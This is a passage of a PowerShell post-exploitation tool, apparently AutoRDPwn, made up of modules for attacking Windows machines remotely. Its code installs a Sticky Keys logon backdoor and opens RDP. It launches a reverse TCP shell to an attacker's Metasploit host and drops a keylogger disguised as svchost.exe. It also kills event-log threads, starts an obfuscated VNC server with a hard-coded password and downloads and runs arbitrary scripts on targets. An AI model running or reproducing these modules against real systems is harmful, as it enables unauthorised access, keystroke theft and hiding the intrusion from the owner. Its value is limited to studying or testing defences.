            New-Item -Path $path -Force | Out-Null
            New-ItemProperty -Path $path -Name 'Debugger' -Value 'powershell.exe -noexit ; clear' -PropertyType String -Force | Out-Null
        }
        New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server' -Name 'fDenyTSConnections' -Value 0 -PropertyType DWORD -Force | Out-Null
        New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name 'LogonTimeout' -Value 3600 -PropertyType DWORD -Force | Out-Null
        Enable-NetFirewallRule -DisplayGroup 'Remote Desktop' -ErrorAction SilentlyContinue
        Enable-NetFirewallRule -Name 'RemoteDesktop-UserMode-In-TCP' -ErrorAction SilentlyContinue
    } | Out-Null
    Write-ARSuccess 'Sticky Keys backdoor installed. Trigger it from the logon screen.'
    Set-ARStatus 'Sticky Keys backdoor installed' 'Ok'
}

function Invoke-ARModuleMetasploit {
    $msfHost = Read-ARValue (Get-ARText 'txt65' 'Enter the IP where MSF is running')
    $msfPort = Read-ARValue (Get-ARText 'txt43' 'Enter the remote port') '4444'
    $template = @'
$client = New-Object System.Net.Sockets.TCPClient('{0}',{1});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()
'@
    $payload = $template -f $msfHost, $msfPort
    if (Test-ARIsLocalTarget) {
        Start-Job -Name ('AutoRDPwn_' + [guid]::NewGuid().ToString('N')) -ScriptBlock { param($code) Invoke-Expression $code } -ArgumentList $payload | Out-Null
    }
    else {
        $session = Get-ARTargetSession
        Invoke-Command -Session $session -ArgumentList $payload -ScriptBlock {
            param($code)
            Start-Job -Name ('AutoRDPwn_' + [guid]::NewGuid().ToString('N')) -ScriptBlock { param($command) Invoke-Expression $command } -ArgumentList $code | Out-Null
        } -ErrorAction Stop | Out-Null
    }
    Write-ARWarn (Get-ARText 'txt63' 'Paste in your Metasploit Framework Console:')
    Write-Host 'use exploit/multi/handler'
    Write-Host 'set payload windows/shell/reverse_tcp'
    Write-Host ('set LHOST ' + $msfHost)
    Write-Host ('set LPORT ' + $msfPort)
    Write-Host 'exploit'
    Set-ARStatus 'Metasploit payload started' 'Ok'
}

function Invoke-ARModuleKeylogger {
    $scriptPath = Get-ARResourcePath 'Resources\Scripts\Invoke-Keylogger.ps1'
    Push-Location $script:ARTools
    try { . $scriptPath; $first = $Content1; $second = $Content2 } finally { Pop-Location }
    if (-not $first -or -not $second) { throw 'The keylogger payload could not be loaded.' }
    $work = New-ARWorkDirectory
    $localDll = Join-Path $work 'dllhost.exe'
    $localHost = Join-Path $work 'svchost.exe'
    [System.IO.File]::WriteAllBytes($localDll, $first)
    [System.IO.File]::WriteAllBytes($localHost, $second)
    if (Test-ARIsLocalTarget) {
        $dll = $localDll
        $hostProcess = $localHost
        Get-Process | Where-Object { $_.Path -eq $hostProcess -or $_.Path -like '*\Local\Temp\svchost.exe' } | Stop-Process -Force -ErrorAction SilentlyContinue
        $logPath = Join-Path $env:LOCALAPPDATA 'config.dat'
        Remove-Item -LiteralPath $logPath -Force -ErrorAction SilentlyContinue
        Push-Location $work
        try { & $dll nomsg explorer.exe $hostProcess | Out-Null } finally { Pop-Location }
        Start-Sleep -Milliseconds 500
        if (-not (Test-Path -LiteralPath $logPath)) { New-Item -ItemType File -Path $logPath -Force | Out-Null }
        Write-ARInfo 'Remote Keylogger | Press Ctrl+C to stop'
        try { Get-Content -LiteralPath $logPath -Wait } finally { Get-Process | Where-Object { $_.Path -eq $hostProcess -or $_.Path -like '*\Local\Temp\svchost.exe' } | Stop-Process -Force -ErrorAction SilentlyContinue }
    }
    else {
        $session = Get-ARTargetSession
        $remoteDirectory = 'C:\Windows\Temp\AutoRDPwnKey_' + [guid]::NewGuid().ToString('N')
        $remoteDll = Join-Path $remoteDirectory 'dllhost.exe'
        $remoteHost = Join-Path $remoteDirectory 'svchost.exe'
        Copy-ARFileToTarget -LocalPath $localDll -RemotePath $remoteDll | Out-Null
        Copy-ARFileToTarget -LocalPath $localHost -RemotePath $remoteHost | Out-Null
        $script:ARRemoteTempDirs.Add($remoteDirectory)
        $logPath = Invoke-Command -Session $session -ArgumentList $remoteDll, $remoteHost -ScriptBlock {
            param($dll, $hostProcess)
            Get-Process | Where-Object { $_.Path -eq $hostProcess -or $_.Path -like '*\Local\Temp\svchost.exe' } | Stop-Process -Force -ErrorAction SilentlyContinue
            $log = Join-Path $env:LOCALAPPDATA 'config.dat'
            Remove-Item -LiteralPath $log -Force -ErrorAction SilentlyContinue
            Push-Location (Split-Path -Parent $dll)
            try { & $dll nomsg explorer.exe $hostProcess | Out-Null } finally { Pop-Location }
            Start-Sleep -Milliseconds 500
            if (-not (Test-Path -LiteralPath $log)) { New-Item -ItemType File -Path $log -Force | Out-Null }
            return $log
        } -ErrorAction Stop
        Write-ARInfo 'Remote Keylogger | Press Ctrl+C to stop'
        try {
            Invoke-Command -Session $session -ArgumentList $logPath -ScriptBlock {
                param($path)
                Get-Content -LiteralPath $path -Wait
            } | ForEach-Object { Write-Host $_ }
        }
        finally {
            try {
                Invoke-Command -Session $session -ArgumentList $remoteHost -ScriptBlock {
                    param($hostProcess)
                    Get-Process | Where-Object { $_.Path -eq $hostProcess -or $_.Path -like '*\Local\Temp\svchost.exe' } | Stop-Process -Force -ErrorAction SilentlyContinue
                } -ErrorAction SilentlyContinue | Out-Null
            } catch { }
        }
    }
    Set-ARStatus 'Keylogger stopped' 'Ok'
}

function Invoke-ARModuleChachi {
    $result = Invoke-ARTargetPowerShell -RelativePath 'Resources\Scripts\Chachi-Enumerator.ps1' -Function 'Comprueba-Todo'
    Show-ARText $result
    Set-ARStatus 'Enumeration finished' 'Ok'
}

function Invoke-ARModuleSherlock {
    $result = Invoke-ARTargetPowerShell -RelativePath 'Resources\Scripts\Sherlock.ps1' -Function 'Find-AllVulns'
    Show-ARText $result
    Set-ARStatus 'Sherlock finished' 'Ok'
}

function Invoke-ARModulePrivescCheck {
    $result = Invoke-ARTargetPowerShell -RelativePath 'Resources\Scripts\Invoke-PrivescCheck.ps1' -Function 'Invoke-PrivescCheck'
    Show-ARText $result
    Set-ARStatus 'Privilege escalation audit finished' 'Ok'
}

function Invoke-ARModulePhant0m {
    $result = Invoke-ARTargetPowerShell -RelativePath 'Resources\Scripts\Invoke-Phant0m.ps1' -Function 'Invoke-Phant0m'
    Show-ARText $result
    Set-ARStatus 'Event log threads stopped' 'Ok'
}

function Invoke-ARModuleVncServer {
    $target = Get-ARTargetComputer
    $scriptPath = Get-ARResourcePath 'Resources\Scripts\Invoke-VNCServer.ps1'
    $encoded = Get-Content -LiteralPath $scriptPath -Raw
    if (Test-ARIsLocalTarget) {
        $array = $encoded.ToCharArray()
        [array]::Reverse($array)
        $decoded = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(($array -join '')))
        Invoke-Expression $decoded | Out-Null
        Invoke-Vnc -ConType bind -Port 5900 -Password AutoRDPwn
    }
    else {
        $session = Get-ARTargetSession
        $remoteDirectory = 'C:\Windows\Temp\AutoRDPwnVnc_' + [guid]::NewGuid().ToString('N')
        $remoteScript = Join-Path $remoteDirectory 'Invoke-VNCServer.ps1'
        Copy-ARFileToTarget -LocalPath $scriptPath -RemotePath $remoteScript | Out-Null
        $script:ARRemoteTempDirs.Add($remoteDirectory)
        Invoke-Command -Session $session -ArgumentList $remoteScript -ScriptBlock {
            param($path)
            $payload = Get-Content -LiteralPath $path -Raw
            $array = $payload.ToCharArray()
            [array]::Reverse($array)
            $decoded = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(($array -join '')))
            Invoke-Expression $decoded | Out-Null
            netsh advfirewall firewall delete rule name="AutoRDPwn VNC" 2>&1> $null
            netsh advfirewall firewall add rule name="AutoRDPwn VNC" dir=in action=allow protocol=TCP localport=5900 2>&1> $null
            Invoke-Vnc -ConType bind -Port 5900 -Password AutoRDPwn
        } -ErrorAction Stop | Out-Null
    }
    Import-ARToolScript 'Resources\Scripts\Invoke-VNCViewer.ps1'
    $viewer = Join-Path $script:ARTools 'VNCViewer.exe'
    if (-not (Test-Path -LiteralPath $viewer)) { throw 'VNCViewer could not be extracted.' }
    $arguments = @('/password', 'AutoRDPwn', $target, '-disablesponsor', '-nostatus', '-notoolbar', '-autoscaling', '-nocursor')
    if ([string]$script:ARTarget['Mode'] -eq 'view') { $arguments += '/viewonly' }
    Start-Process -FilePath $viewer -ArgumentList $arguments | Out-Null
    Set-ARStatus 'VNC server started' 'Ok'
}

function Invoke-ARModuleExternalScript {
    $source = Read-ARValue (Get-ARText 'txt73' 'Enter the path or url of the script')
    $function = Read-ARLineValue (' ' + (Get-ARText 'txt74' 'Write the function you want to execute') + ' [none]: ')
    if ($null -eq $function) { $function = '' } else { $function = $function.Trim() }
    if ($source -match '^https?://') {
        $work = New-ARWorkDirectory
        $localScript = Join-Path $work 'external.ps1'
        Invoke-ARDownload -Url $source -OutFile $localScript
    }
    elseif (Test-Path -LiteralPath $source) {
        $localScript = (Resolve-Path -LiteralPath $source).Path
    }
    else { throw 'The external script could not be found.' }
    if (Test-ARIsLocalTarget) {
        $result = & {
            param($path, $functionName)
            . $path
            if ($functionName -ne '') { Invoke-Expression $functionName }
        } $localScript $function
        Show-ARText $result
    }
    else {
        $session = Get-ARTargetSession
        $remoteDirectory = 'C:\Windows\Temp\AutoRDPwnScript_' + [guid]::NewGuid().ToString('N')
        $remoteScript = Join-Path $remoteDirectory 'external.ps1'
        Copy-ARFileToTarget -LocalPath $localScript -RemotePath $remoteScript | Out-Null
        $script:ARRemoteTempDirs.Add($remoteDirectory)
        $result = Invoke-Command -Session $session -ArgumentList $remoteScript, $function -ScriptBlock {
            param($path, $functionName)
            Push-Location (Split-Path -Parent $path)
            try {
                . $path
                if ($functionName -ne '') { Invoke-Expression $functionName }
            }
            finally { Pop-Location }
        } -ErrorAction Stop
        Show-ARText $result
    }
    Set-ARStatus 'External script executed' 'Ok'
}

function Invoke-ARModuleRunAs {
    if (-not (Test-ARIsLocalTarget)) { throw 'RunAs only works on the local computer.' }
    $user = Read-ARValue (Get-ARText 'txt78' 'Enter the username')
    $plain = Read-ARSecret 'Password'
    Add-Type -AssemblyName System.DirectoryServices.AccountManagement
    $context = New-Object System.DirectoryServices.AccountManagement.PrincipalContext('machine', $env:COMPUTERNAME)
    if (-not $context.ValidateCredentials($user, $plain)) {
        throw (Get-ARText 'txt81' 'Wrong credentials! Returning to the main menu..')
    }
    Import-ARToolScript 'Resources\Scripts\Invoke-RunAs.ps1'
    $executable = Join-Path $script:ARTools 'RunAs.exe'
    if (-not (Test-Path -LiteralPath $executable)) { throw 'RunAs could not be extracted.' }
    & $executable -u $user -p $plain -e 'powershell.exe -NoExit'
    Set-ARStatus 'Process launched as the new user' 'Ok'
}

function Show-ARLineLanguagePicker {
    $languages = @('English', 'Spanish', 'French', 'German', 'Italian', 'Russian', 'Portuguese')
    Write-Host ''
    for ($index = 0; $index -lt $languages.Count; $index++) {
        Write-Host (' {0}. {1}' -f ($index + 1), $languages[$index]) -ForegroundColor Gray
    }
    $defaultIndex = [Array]::IndexOf($languages, $script:ARLocaleName)
    if ($defaultIndex -lt 0) { $defaultIndex = 0 }
    $choice = Read-ARValue 'Language (1-7)' ([string]($defaultIndex + 1))
    $name = Resolve-ARLanguageName $choice
    Initialize-ARLanguage $name
    Set-ARStatus ('Language: ' + $name) 'Ok'
}

function Start-ARApplication {
    Initialize-ARLanguage $script:ARLanguageArgument
    if ($script:ARShadowPreference -in @('see', 'view', 'ver', 'regarder', 'siehe', 'vedere')) {
        $script:ARTarget['Mode'] = 'view'
    }
    elseif ($script:ARShadowPreference -in @('control', 'controlar', 'controle', 'kontrolle', 'controllo')) {
        $script:ARTarget['Mode'] = 'control'
    }
    Initialize-ARDefender
    Set-ARStatus 'Ready' 'Info'

    if ($script:ARInvokedFromOption) {
        $selection = Resolve-ARSelection $script:AROptionValue
        if ($selection -like 'ACTION:*') {
            Invoke-ARAction $selection.Substring(7)
            return
        }
        throw ('Unknown option: ' + $script:AROptionValue)
    }

    while ($true) {
        if ($script:ARNoGui -or [Console]::IsInputRedirected) {
            $selection = Show-ARLineMenu
            if ([string]::IsNullOrWhiteSpace($selection) -or $selection -eq 'QUIT') { break }
            if ($selection -eq 'TARGET') { Show-ARLineTargetForm; continue }
            if ($selection -eq 'LANGUAGE') { Show-ARLineLanguagePicker; continue }
            if ($selection -like 'ACTION:*') { Invoke-ARAction $selection.Substring(7); continue }
            Set-ARStatus (Get-ARText 'txt6' 'Incorrect option, try again') 'Warn'
            continue
        }
        $selection = Show-ARTui
        if ([string]::IsNullOrWhiteSpace($selection) -or $selection -eq 'QUIT') { break }
        if ($selection -eq 'TARGET') { continue }
        if ($selection -eq 'LANGUAGE') {
            $language = Show-ARLanguagePicker
            if ($language -ne '') { Initialize-ARLanguage $language }
            continue
        }
        if ($selection -like 'ACTION:*') { Invoke-ARAction $selection.Substring(7); continue }
    }
}

try {
    Start-ARApplication
}
catch {
    Write-ARError $_.Exception.Message
}
finally {
    Invoke-ARCleanup
}
